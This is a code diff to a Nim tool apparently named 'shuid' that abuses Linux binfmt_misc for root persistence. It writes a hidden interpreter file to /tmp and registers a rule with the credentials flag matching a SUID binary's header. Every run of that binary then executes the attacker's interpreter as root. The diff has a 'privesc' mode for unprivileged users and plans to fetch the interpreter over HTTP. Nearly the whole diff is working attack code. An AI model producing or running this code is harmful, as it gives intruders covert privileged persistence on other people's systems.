@@ -6,11 +6,19 @@ import std/strutils
 import streams
 import terminal
 
+const BINFMT_DIR = "/proc/sys/fs/binfmt_misc/"
+const REGISTER_PATH = BINFMT_DIR & "register"
+const RULE_NAME {.strdefine.}: string = ".shuid"
+
 const ELF_HEADER = ['\x7F', 'E', 'L', 'F', '\x02', '\x01', '\x01', '\x00']
 const HEADER_SIZE = 8
 const MAGIC_SIZE = 126
+
 const SUID_PERM = 0o4000
 const EXEC_PERM = 0o100
+
+const INTERPRETER_PATH: string = "/tmp/.6wwMkxWeWd"
+const INTERPRETER_CONTENT {.strdefine.}: string = ""
 
 proc checkBinfmt(privesc:bool):bool=
   ## Different checks to verify that the binfmt config allow the exploit
@@ -94,26 +102,37 @@ proc searchSuid(dir, file: string,chooseFile: bool): string=
   elif suids.len > 0 : return suids[^1]
   return ""
 
-proc exploit(suid, payload: string): void=
+proc exploit(registerPath, suidPath, interpreter: string): void=
   ## Exploit BIN_FMT feature to register a new type of executable
-  ## - Check that suid is an ELF binary
+  ## - check that suid is an ELF binary
   ## - create interpreter
   ## - register the interpreter
-
+  
   # read header of suid file(for magic_number)
-  let stream = newFileStream(suid, mode = fmRead)
+  let stream = newFileStream(suidPath, mode = fmRead)
   defer: stream.close()
   # Check magic string
-  var magic_string: array[HEADER_SIZE, char]
-  discard stream.readData(magic_string.addr, HEADER_SIZE)    
-  if magic_string != ELF_HEADER:
-    styledEcho("❌ SUID file, ",suid,fgRed," is not an ELF binary")
+  var magicNumber: array[HEADER_SIZE, char]
+  discard stream.readData(magicNumber.addr, HEADER_SIZE) 
+  if magicNumber != ELF_HEADER:
+    styledEcho("❌ SUID file, ",suidPath,fgRed," is not an ELF binary")
     quit(QuitSuccess)
 
-  # build intepreter
+  # retrieve interpreter (from now it is done at compilation time)
+  # write interpreter in fs
+  writeFile(INTERPRETER_PATH, interpreter)
+  setFilePermissions(INTERPRETER_PATH, {fpUserWrite, fpUserRead, fpUserExec})
   # register interpreter
+  stream.setPosition(0)
+  var headerSuidHex,registerLine: string
+  for i in 1..128:
+    headerSuidHex &= "\\x"&toHex($(stream.readChar()))
+  registerLine= ":$1:M::$2::$3:C" % [RULE_NAME, headerSuidHex, INTERPRETER_PATH]
+  writeFile(BINFMT_DIR & RULE_NAME, "1")
+  writeFile(registerPath, registerLine)
+  
 
-
+  # BOOM!
   echo("\n🌒  binfmt has been exploited to maintain privileged persistence.")
   echo "\e[2mWelcome in the shadow\e[0m"
 
@@ -122,10 +141,15 @@ proc shuid(
   check = true, 
   file = "", 
   searchDir="/bin", 
-  chooseFile = false, 
-  payload = "/bin/sh",
+  chooseFile = false,
   noExec=false
   ): void =
+  ## shuid is define command line arguments to perform shadow suid file
+  #[
+    TODO:
+      - Get interpreter binary content from HTTP (not statically linked)
+      - Specify interpreter name and location
+  ]#
   if check:
     if checkBinfmt(privesc):
       styledEcho("✔️ binfmt kernel feature is",fgGreen," enabled")
@@ -138,9 +162,7 @@ proc shuid(
     styledEcho("❌ No SUID file in ",fgRed,searchDir)
     quit(QuitSuccess)
 
-  exploit(suid,payload)
-  
-
+  exploit(REGISTER_PATH,suid,INTERPRETER_CONTENT)
 
 when isMainModule:
   import cligen;  dispatch shuid, help={"privesc": "run in unprivileged mode to obtain privesc",
@@ -148,6 +170,5 @@ when isMainModule:
   "file": "SUID file to use",
   "searchDir": "directory use to find SUID file",
   "chooseFile": "choose SUID file to use from the list (if not taken randomly)",
-  "payload": "payload to execute to maintain peristance (run with privileged permissions)",
   "noExec": "do not exec SUID file"
   }
